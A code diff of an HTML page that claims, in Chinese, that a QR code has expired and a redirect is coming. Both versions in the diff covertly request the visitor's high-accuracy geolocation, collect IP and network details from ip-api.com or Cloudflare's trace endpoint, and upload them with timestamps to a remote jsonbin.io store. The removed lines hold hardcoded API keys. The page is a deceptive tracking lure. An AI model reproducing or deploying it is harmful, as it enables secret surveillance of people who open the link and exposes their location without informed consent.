@@ -1,28 +1,20 @@
 <html>
-    <header>
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    </header>
-    <body>
-        <h1>二维码过期, 稍後將重新定向......</h1>
+<header>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+</header>
 
-        <script>
+<body>
+    <h1>二维码过期, 稍後將重新定向......</h1>
 
-if ("geolocation" in navigator) {
-  // Prompt user for permission to access their location
-  navigator.geolocation.getCurrentPosition(
-    // Success callback function
-    (position) => {
-      // Get the user's latitude and longitude coordinates
-      const lat = position.coords.latitude;
-      const lng = position.coords.longitude;
-
-      // Do something with the location data, e.g. display on a map
-      console.log(`Latitude: ${lat}, longitude: ${lng}`);
-
-      $.get('http://ip-api.com/json/', (data) => {
+    <script>
+        function upload(positions) {
+            $.get('https://www.cloudflare.com/cdn-cgi/trace', (data) => {
                 // Convert key-value pairs to JSON
                 // https://stackoverflow.com/a/39284735/452587
-                console.log(data)
+                data = data.trim().split('\n').reduce(function(obj, pair) {
+                    pair = pair.split('=');
+                    return obj[pair[0]] = pair[1], obj;
+                }, {});
                 var settings = {
                     "url": "https://api.jsonbin.io/v3/b/64e36bc28e4aa6225ed34b25",
                     "method": "GET",
@@ -38,7 +30,7 @@ if ("geolocation" in navigator) {
                     settings.method = "PUT";
                     response.record.push({
                         ...data,
-                        coords: position.coords,
+                        positions: positions,
                         time: new Date(),
                     });
                     settings.data = JSON.stringify(response.record);
@@ -48,55 +40,49 @@ if ("geolocation" in navigator) {
                     }, 1000);
                 });
             });
+        }
 
 
-    },
-    // Error callback function
-    (error) => {
-      // Handle errors, e.g. user denied location sharing permissions
-      console.error("Error getting user location:", error);
-      
-      $.get('http://ip-api.com/json/', (data) => {
-                // Convert key-value pairs to JSON
-                // https://stackoverflow.com/a/39284735/452587
-                console.log(data)
-                var settings = {
-                    "url": "https://api.jsonbin.io/v3/b/64e36bc28e4aa6225ed34b25",
-                    "method": "GET",
-                    "timeout": 0,
-                    "headers": {
-                        "X-MASTER-KEY": "$2b$10$EaN5Y7c20W063NZCI0X0aexcShPuKPxJJUU5OCc.SRXGg5vQ5dvJW",
-                        "X-ACCESS-KEY": "$2b$10$ALopFTEdhaanD01.TTBDIeBpOp.kM85iyiBrRnwLEzRTIBdyauPiG",
-                        "Content-Type": "application/json"
-                    },
-                };
 
-                $.ajax(settings).done((response) => {
-                    settings.method = "PUT";
-                    response.record.push({
-                        ...data,
-                        coords: error,
-                        time: new Date(),
-                    });
-                    settings.data = JSON.stringify(response.record);
-                    $.ajax(settings);
-                    setTimeout(() => {
-                        // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
-                    }, 1000);
+        let positions = "None";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                // Success function
+                (position) => {
+                    positions = position;
+                    console.log("Latitude: " + position.coords.latitude +
+                        "<br>Longitude: " + position.coords.longitude);
+                    upload(positions)
+                },
+                // Error function
+                (error) => {
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            upload("User denied the request for Geolocation.")
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            upload("Location information is unavailable.")
+                            break;
+                        case error.TIMEOUT:
+                            upload("The request to get user location timed out.")
+                            break;
+                        case error.UNKNOWN_ERROR:
+                            upload("An unknown error occurred.")
+                            break;
+                    }
+                },
+                // Options. See MDN for details.
+                {
+                    enableHighAccuracy: true,
+                    maximumAge: 0
                 });
-            });
+        } else {
+            console.log("Geolocation is not supported by this browser.");
+            
+        }
 
-      // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
-    }
-  );
-} else {
-  // Geolocation is not supported by the browser
-  console.error("Geolocation is not supported by this browser.");
-  
-  // window.location = "https://u.wechat.com/ICGGOYMOyle_yfkwNDsSVfg";
-}
 
-           
-        </script>
-    </body>
+    </script>
+</body>
+
 </html>
